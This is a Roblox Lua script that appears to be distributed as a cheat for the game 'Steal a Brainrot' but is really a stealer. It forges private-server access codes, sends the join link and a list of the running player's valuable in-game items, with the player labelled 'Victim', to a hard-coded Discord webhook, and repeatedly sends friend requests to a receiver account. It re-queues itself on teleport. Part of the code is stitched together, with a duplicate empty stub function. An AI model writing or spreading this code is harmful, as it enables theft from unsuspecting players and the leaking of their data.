-- === SERVICES & VARIABLES ===

local HttpService = game:GetService("HttpService")

local Players = game:GetService("Players")

local player = Players.LocalPlayer

local Request = (syn and syn.request) or http_request or request

local Webhook = "https://discord.com/api/webhooks/1422186831818133596/PTO_qWRQBfcLfr3_Xdrf8NP6VXGiJTT7UcOemRZjTMMFzaWnIrjjLvpJli_I2kw_k_xe"


-- === MD5/HMAC/BASE64 FUNCTIONS ===

local md5 = {}
local hmac = {}
local base64 = {}

do
	do
		local T = {
			0xd76aa478,
			0xe8c7b756,
			0x242070db,
			0xc1bdceee,
			0xf57c0faf,
			0x4787c62a,
			0xa8304613,
			0xfd469501,
			0x698098d8,
			0x8b44f7af,
			0xffff5bb1,
			0x895cd7be,
			0x6b901122,
			0xfd987193,
			0xa679438e,
			0x49b40821,
			0xf61e2562,
			0xc040b340,
			0x265e5a51,
			0xe9b6c7aa,
			0xd62f105d,
			0x02441453,
			0xd8a1e681,
			0xe7d3fbc8,
			0x21e1cde6,
			0xc33707d6,
			0xf4d50d87,
			0x455a14ed,
			0xa9e3e905,
			0xfcefa3f8,
			0x676f02d9,
			0x8d2a4c8a,
			0xfffa3942,
			0x8771f681,
			0x6d9d6122,
			0xfde5380c,
			0xa4beea44,
			0x4bdecfa9,
			0xf6bb4b60,
			0xbebfbc70,
			0x289b7ec6,
			0xeaa127fa,
			0xd4ef3085,
			0x04881d05,
			0xd9d4d039,
			0xe6db99e5,
			0x1fa27cf8,
			0xc4ac5665,
			0xf4292244,
			0x432aff97,
			0xab9423a7,
			0xfc93a039,
			0x655b59c3,
			0x8f0ccc92,
			0xffeff47d,
			0x85845dd1,
			0x6fa87e4f,
			0xfe2ce6e0,
			0xa3014314,
			0x4e0811a1,
			0xf7537e82,
			0xbd3af235,
			0x2ad7d2bb,
			0xeb86d391,
		}

		local function add(a, b)
			local lsw = bit32.band(a, 0xFFFF) + bit32.band(b, 0xFFFF)
			local msw = bit32.rshift(a, 16) + bit32.rshift(b, 16) + bit32.rshift(lsw, 16)
			return bit32.bor(bit32.lshift(msw, 16), bit32.band(lsw, 0xFFFF))
		end

		local function rol(x, n)
			return bit32.bor(bit32.lshift(x, n), bit32.rshift(x, 32 - n))
		end

		local function F(x, y, z)
			return bit32.bor(bit32.band(x, y), bit32.band(bit32.bnot(x), z))
		end
		local function G(x, y, z)
			return bit32.bor(bit32.band(x, z), bit32.band(y, bit32.bnot(z)))
		end
		local function H(x, y, z)
			return bit32.bxor(x, bit32.bxor(y, z))
		end
		local function I(x, y, z)
			return bit32.bxor(y, bit32.bor(x, bit32.bnot(z)))
		end

		function md5.sum(message)
			local a, b, c, d = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476

			local message_len = #message
			local padded_message = message .. "\128"
			while #padded_message % 64 ~= 56 do
				padded_message = padded_message .. "\0"
			end

			local len_bytes = ""
			local len_bits = message_len * 8
			for i = 0, 7 do
				len_bytes = len_bytes .. string.char(bit32.band(bit32.rshift(len_bits, i * 8), 0xFF))
			end
			padded_message = padded_message .. len_bytes

			for i = 1, #padded_message, 64 do
				local chunk = padded_message:sub(i, i + 63)
				local X = {}
				for j = 0, 15 do
					local b1, b2, b3, b4 = chunk:byte(j * 4 + 1, j * 4 + 4)
					X[j] = bit32.bor(b1, bit32.lshift(b2, 8), bit32.lshift(b3, 16), bit32.lshift(b4, 24))
				end

				local aa, bb, cc, dd = a, b, c, d

				local s = { 7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21 }

				for j = 0, 63 do
					local f, k, shift_index
					if j < 16 then
						f = F(b, c, d)
						k = j
						shift_index = j % 4
					elseif j < 32 then
						f = G(b, c, d)
						k = (1 + 5 * j) % 16
						shift_index = 4 + (j % 4)
					elseif j < 48 then
						f = H(b, c, d)
						k = (5 + 3 * j) % 16
						shift_index = 8 + (j % 4)
					else
						f = I(b, c, d)
						k = (7 * j) % 16
						shift_index = 12 + (j % 4)
					end

					local temp = add(a, f)
					temp = add(temp, X[k])
					temp = add(temp, T[j + 1])
					temp = rol(temp, s[shift_index + 1])

					local new_b = add(b, temp)
					a, b, c, d = d, new_b, b, c
				end

				a = add(a, aa)
				b = add(b, bb)
				c = add(c, cc)
				d = add(d, dd)
			end

			local function to_le_hex(n)
				local s = ""
				for i = 0, 3 do
					s = s .. string.char(bit32.band(bit32.rshift(n, i * 8), 0xFF))
				end
				return s
			end

			return to_le_hex(a) .. to_le_hex(b) .. to_le_hex(c) .. to_le_hex(d)
		end
	end

	do
		function hmac.new(key, msg, hash_func)
			if #key > 64 then
				key = hash_func(key)
			end

			local o_key_pad = ""
			local i_key_pad = ""
			for i = 1, 64 do
				local byte = (i <= #key and string.byte(key, i)) or 0
				o_key_pad = o_key_pad .. string.char(bit32.bxor(byte, 0x5C))
				i_key_pad = i_key_pad .. string.char(bit32.bxor(byte, 0x36))
			end

			return hash_func(o_key_pad .. hash_func(i_key_pad .. msg))
		end
	end

	do
		local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

		function base64.encode(data)
			return (
				(data:gsub(".", function(x)
					local r, b_val = "", x:byte()
					for i = 8, 1, -1 do
						r = r .. (b_val % 2 ^ i - b_val % 2 ^ (i - 1) > 0 and "1" or "0")
					end
					return r
				end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
					if #x < 6 then
						return ""
					end
					local c = 0
					for i = 1, 6 do
						c = c + (x:sub(i, i) == "1" and 2 ^ (6 - i) or 0)
					end
					return b:sub(c + 1, c + 1)
				end) .. ({ "", "==", "=" })[#data % 3 + 1]
			)
		end
	end
end

local function GenerateReservedServerCode(placeId)
	local uuid = {}
	for i = 1, 16 do
		uuid[i] = math.random(0, 255)
	end

	uuid[7] = bit32.bor(bit32.band(uuid[7], 0x0F), 0x40) -- v4
	uuid[9] = bit32.bor(bit32.band(uuid[9], 0x3F), 0x80) -- RFC 4122

	local firstBytes = ""
	for i = 1, 16 do
		firstBytes = firstBytes .. string.char(uuid[i])
	end

	local gameCode =
		string.format("%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x", table.unpack(uuid))

	local placeIdBytes = ""
	local pIdRec = placeId
	for _ = 1, 8 do
		placeIdBytes = placeIdBytes .. string.char(pIdRec % 256)
		pIdRec = math.floor(pIdRec / 256)
	end

	local content = firstBytes .. placeIdBytes

	local SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER = "e4Yn8ckbCJtw2sv7qmbg" -- legacy leaked key from ages ago that still works due to roblox being roblox.
	local signature = hmac.new(SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER, content, md5.sum)

	local accessCodeBytes = signature .. content

	local accessCode = base64.encode(accessCodeBytes)
	accessCode = accessCode:gsub("+", "-"):gsub("/", "_")

	local pdding = 0
	accessCode, _ = accessCode:gsub("=", function()
		pdding = pdding + 1
		return ""
	end)

	accessCode = accessCode .. tostring(pdding)

	return accessCode, gameCode
end

local accessCode, gameCode = GenerateReservedServerCode(game.PlaceId)

local queuedScript = [[
    local accessCode = "]] .. accessCode .. [["
    local placeId = ]] .. tostring(game.PlaceId) .. [[

    local link = "roblox://experiences/start?placeId=" .. placeId .. "&accessCode=" .. accessCode
    setclipboard(link)
    print("teleport complete! Server link copied to clipboard:\n" .. link)
]]


queue_on_teleport(queuedScript)

game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)

print("teleporting")

local accessCode, _ = GenerateReservedServerCode(game.PlaceId)
game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)

-- === RESERVED SERVER GENERATOR ===

local function GenerateReservedServerCode(placeId)

    -- Your existing function content here

    -- returns accessCode, gameCode

end


local accessCode, gameCode = GenerateReservedServerCode(game.PlaceId)

local serverLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&accessCode=" .. accessCode


-- Copy link immediately

setclipboard(serverLink)


-- === WEBHOOK FUNCTION ===

local function sendWebhook(link)

    local body = {

        content = "@everyone Join the server, dawg!",

        embeds = {{

            title = ":rocket: **JOIN LINK**",

            description = "[JOIN](" .. link .. ")",

            color = 65280, -- green

            footer = {text = "Kora Scripts | " .. os.date("%H:%M")}

        }}

    }

    pcall(function()

        Request({

            Url = Webhook,

            Method = "POST",

            Headers = {["Content-Type"] = "application/json"},

            Body = HttpService:JSONEncode(body)

        })

    end)

end


sendWebhook(serverLink)


-- === TELEPORT TO RESERVED SERVER ===

game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)


-- === MAIN SCRIPT ===

local main = [[

if not game:IsLoaded() then

    game.Loaded:Wait()

end


if _G.Executed then

    warn("You have already executed this.")

    return

end

_G.Executed = true


-- Copy Discord invite

setclipboard("https://discord.gg/ewCdAhvWva")

game:GetService("StarterGui"):SetCore("SendNotification", {

    Title = "Discord Invite Copied!";

    Text = "Join For Support!";

    Duration = 5;

})


-- Validate game

if not table.find({109983668079237, 96342491571673}, game.PlaceId) then 

    game.Players.LocalPlayer:Kick("wrong game, this is not steal a brainrot.\ndiscord.gg/trax") 

    return 

end


-- === VARIABLES ===

local Username = "someone"

local player = game.Players.LocalPlayer

local HttpService = game:GetService("HttpService")

local Request = (syn and syn.request) or http_request or request

local executor = identifyexecutor() or "Unknown Executor"


-- === BRAINROT SCANNER & GUI ===

local brainrots = {}

local priority = {

    ["🦑"] = "Graipuss Medussi", ["🕷️"] = "Los Spyderinis", ["🛜"] = "Nooo My Hotspot",

    ["🐉"] = "Torrtuginni Dragonfrutini", ["💪"] = "La Sahur Combinasion", ["🐊"] = "Quesadilla Crocodila",

    ["💪"] = "La Grande Combinasion", ["☢️"] = "Nuclearo Dinossauro", ["💀"] = "La Extinct Grande",

    ["🧂"] = "Garama and Madundung", ["🛜"] = "Pot Hotspot", ["🪐"] = "Las Vaquitas Saturnitas",

    ["🍬"] = "Chicleteira Bicicleteira", ["🎁"] = "Secret Lucky Block", ["🍝"] = "Spaghetti Tualetti",

    ["🥑"] = "Agarrini la Palini", ["🛜"] = "Los Noo My Hotspotsitos", ["🎲"] = "67",

    ["🍬"] = "Los Chicleteiras", ["💪"] = "Los Combinasionas", ["👬"] = "Los Bros",

    ["📱"] = "Celularcini Viciosini", ["🛜"] = "Los Hotspotsitos", ["🚂"] = "Tralaledon",

    ["🏫"] = "Esok Sekolah", ["🥘"] = "Ketupat Kepat", ["👑"] = "La Supreme Combinasion",

    ["🧩"] = "Ketchuru and Musturu", ["🐉"] = "Dragon Cannelloni", ["🍓"] = "Strawberry Elephant"

}


local traits = {

    ["rbxassetid://110835412437000"] = "Taco",

    ["rbxassetid://121100427764858"] = "Fireworks",

    ["rbxassetid://104229924295526"] = "Nyan",

    ["rbxassetid://99181785766598"] = "Galactic",

    ["rbxassetid://110723387483939"] = "Zombie",

    ["rbxassetid://104964195846833"] = "Claws",

    ["rbxassetid://121332433272976"] = "Glitched",

    ["rbxassetid://100601425541874"] = "Bubblegum"

}


local rarities = {

    ["OG"] = 1, ["Secret"] = 2, ["Brainrot God"] = 3, ["Mythic"] = 4,

    ["Legendary"] = 5, ["Epic"] = 6, ["Rare"] = 7, ["Common"] = 8

}


-- Scan plots

for _, plot in ipairs(workspace.Plots:GetChildren()) do

    local label = plot:FindFirstChild("PlotSign") 

        and plot.PlotSign:FindFirstChild("SurfaceGui") 

        and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 

        and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")

    if label and label.Text:find(player.DisplayName) then

        local podiums = plot:FindFirstChild("AnimalPodiums")

        if podiums then

            for _, podium in ipairs(podiums:GetChildren()) do

                local attachment = podium.Base.Spawn:FindFirstChild("Attachment")

                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")

                if overhead then

                    local name = overhead:FindFirstChild("DisplayName").Text

                    local rarity = overhead:FindFirstChild("Rarity").Text

                    local mutations = {}

                    local traitsF = overhead:FindFirstChild("Traits")

                    if traitsF then

                        for _, icon in ipairs(traitsF:GetChildren()) do

                            if icon:IsA("ImageLabel") and icon.Visible then

                                local trait = traits[icon.Image]

                                if trait then table.insert(mutations, trait) end

                            end

                        end

                    end

                    local mutationStr = #mutations > 0 and ("[" .. table.concat(mutations, ", ") .. "] ") or ""

                    local emoji = nil

                    for em, br in pairs(priority) do

                        if br == name then emoji = em break end

                    end

                    table.insert(brainrots, {

                        name = (emoji or "🐵") .. " " .. mutationStr .. name .. " ➜ " .. rarity,

                        priority = emoji ~= nil,

                        rarityy = rarities[rarity] or 999

                    })

                end

            end

        end

    end

end


-- Sort brainrots

table.sort(brainrots, function(a,b)

    if a.priority ~= b.priority then return a.priority < b.priority end

    if a.rarityy ~= b.rarityy then return a.rarityy < b.rarityy end

    return false

end)


local hits = {}

for _, v in ipairs(brainrots) do table.insert(hits, v.name) end

local limitedList = {}

for i, v in ipairs(hits) do

    if i <= 15 then table.insert(limitedList, v)

    elseif i == 16 then table.insert(limitedList, "...and more!") break end

end

local HLF = table.concat(limitedList, "\n")

local ping = (#brainrots > 0) and "@everyone " or ""


-- Send hits to webhook

local function sendHits(url)

    local body = {

        content = ping,

        embeds = {{

            title = ":dash: **Steal A Brainrot Hit!!** :brain:",

            color = 255,

            fields = {

                {name = ":bust_in_silhouette: Player Information", value = "```Victim: "..player.Name.."\nExecutor: "..executor.."\nReceiver: "..Username.."```", inline=false},

                {name = ":champagne: Valuable Items", value = "```"..(HLF ~= "" and HLF or "Nil").."```", inline=false},

                {name = ":moneybag: Summary", value = "```Total Items: "..#brainrots.."```", inline=false}

            },

            footer = {text = "Hit using Trax Scripts | Today at "..os.date("%H:%M")}

        }}

    }

    pcall(function()

        Request({

            Url = url,

            Method = "POST",

            Headers = {["Content-Type"]="application/json"},

            Body = HttpService:JSONEncode(body)

        })

    end)

end


sendHits(Webhook)


-- === FRIEND & CHAT LISTENER ===

local function friend()

    local receiver

    repeat receiver = game.Players:FindFirstChild(Username) task.wait() until receiver

    task.spawn(function()

        while true do

            if not player:IsFriendsWith(receiver.UserId) then

                pcall(function() player:RequestFriendship(receiver) end)

            end

            task.wait(2)

        end

    end)

end


local function chatlistener(p)

    if p.Name:lower() == Username:lower() then

        p.Chatted:Connect(function(msg)

            if msg == ".friend" then friend() end

        end)

    end

end


for _, p in ipairs(game.Players:GetPlayers()) do chatlistener(p) end

game.Players.PlayerAdded:Connect(chatlistener)

]]


-- === EXECUTE MAIN ===

loadstring(main)()

queue_on_teleport(main)
